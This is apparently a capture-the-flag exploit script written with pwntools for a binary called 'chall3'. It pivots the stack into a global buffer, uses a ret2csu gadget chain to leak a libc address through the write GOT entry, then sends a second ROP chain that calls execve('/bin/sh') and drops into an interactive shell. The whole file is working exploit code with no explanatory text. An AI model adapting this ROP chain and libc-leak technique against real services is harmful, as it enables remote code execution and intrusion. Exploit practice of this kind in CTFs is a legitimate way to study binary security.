from pwn import *


elf = ELF("./chall3")
libc = ELF("./libc-2.31.so")

#io = process("./chall3")
io = remote("localhost",4444)

#buf addr 0x06010a0
#main addr 0x0400724

#calling rdi,rsi,rdx
main_addr = 0x0400724
buf_addr = 0x06010a0
leave_ret = 0x0000000000400722

csu_pop_6_ret = 0x40085a
csu_call = 0x400840

buf = "B"*8 + p64(csu_pop_6_ret) + p64(0x0) + p64(1) + p64(elf.got['write'])+ p64(1)+ p64(elf.got['write']) + p64(8)
buf += p64(csu_call)
buf += p64(0)		#nop
buf += p64(0)		#rbx
buf += p64(buf_addr + 0x200-0x50) #rbp

buf += ((0x150 - len(buf))/8 ) * p64(leave_ret)
buf += "A"*8 
buf +=((0x200-len(buf))/8) * p64(main_addr) 

payload = "A"*0x10
payload += p64(buf_addr)
payload += p64(leave_ret)


#0x00000000004007f2
#gdb.attach(io,'b*0x40084d')
#raw_input()
io.sendafter('name : ',buf)
io.sendafter('note : ',payload)


leak = io.recvuntil("\x7f")
libc_addr = u64(leak[-6:].ljust(8,"\x00"))-libc.sym['write']

pop_rdx_pop_rbx_ret = libc_addr + 0x00000000001626d5
pop_rsi_pop_r15_ret = 0x0000000000400861
pop_rdi_ret = 0x0000000000400863 

binsh = libc_addr + libc.search("/bin/sh").next()
payload2 = "A"*8 + p64(pop_rdi_ret) + p64(binsh) + p64(pop_rsi_pop_r15_ret) + p64(0) + p64(0) + p64(pop_rdx_pop_rbx_ret) + p64(0) + p64(0) +p64(0)+ p64(libc_addr + libc.sym['execve']) 
#raw_input()
io.sendline(payload2)
io.sendafter("note : ",payload)



io.interactive()